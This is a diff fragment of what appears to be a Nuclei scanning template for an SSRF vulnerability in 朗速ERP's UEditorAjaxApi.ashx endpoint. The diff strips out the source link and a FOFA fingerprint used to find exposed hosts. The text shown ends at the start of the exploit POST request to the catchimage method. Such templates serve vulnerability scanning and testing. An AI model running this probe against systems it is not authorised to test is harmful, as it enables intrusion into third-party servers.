@@ -3,12 +3,8 @@ info:
   name: 朗速ERP UEditorAjaxApi.ashx 存在SSRF漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fk3h5g35emtok93a'
+  description: ''
   tags: ssrf,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: fk3h5g35emtok93a
-    fofa: body="/Resource/Scripts/Yw/Yw_Bootstrap.js"
 http:
 - raw:
   - 'POST /Api/UEditor/UEditorAjaxApi.ashx?method=catchimage HTTP/1.1
